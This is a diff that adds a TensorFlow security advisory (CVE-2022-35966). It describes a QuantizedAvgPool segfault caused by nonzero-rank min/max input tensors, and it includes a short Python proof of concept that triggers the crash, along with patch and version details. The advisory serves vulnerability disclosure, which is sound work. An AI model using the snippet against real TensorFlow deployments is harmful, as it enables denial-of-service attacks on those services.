@@ -1,0 +1,22 @@
+<h2>TFSA-2022-098: Segfault in <code>QuantizedAvgPool</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35966</p>
+<h3>Impact</h3>
+<p>If <code>QuantizedAvgPool</code> is given <code>min_input</code> or <code>max_input</code> tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
+```python
+import tensorflow as tf</p>
+<p>ksize = [1, 2, 2, 1]
+strides = [1, 2, 2, 1]
+padding = "SAME"
+input = tf.constant(1, shape=[1,4,4,2], dtype=tf.quint8)
+min_input = tf.constant([], shape=[0], dtype=tf.float32)
+max_input = tf.constant(0, shape=[1], dtype=tf.float32)
+tf.raw_ops.QuantizedAvgPool(input=input, min_input=min_input, max_input=max_input, ksize=ksize, strides=strides, padding=padding)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622">7cdf9d4d2083b739ec81cfdace546b0c99f50622</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.</p>
